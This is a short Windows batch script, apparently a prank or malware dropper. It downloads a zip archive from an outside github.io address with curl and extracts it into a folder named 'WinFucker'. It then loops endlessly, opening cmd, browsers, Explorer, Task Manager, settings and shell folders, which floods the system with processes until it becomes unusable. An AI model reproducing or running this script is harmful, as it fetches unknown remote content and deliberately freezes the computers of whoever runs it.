curl -o "@Wanna.BuddyMemes.win.zip" https://monkebutcool.github.io/
mkdir WinFucker
tar -xf "@Wanna.BuddyMemes.win.zip" -C WinFucker
cd WinFucker
for %%i in (cmd chrome Firefox explorer ms-settings: taskmgr shell:RecycleBinFolder explorer shell:AppsFolder) do start "" "%%i"
goto :loop

:loop
for %%i in (cmd chrome Firefox explorer ms-settings: taskmgr shell:RecycleBinFolder explorer shell:AppsFolder) do start "" "%%i"
goto :loop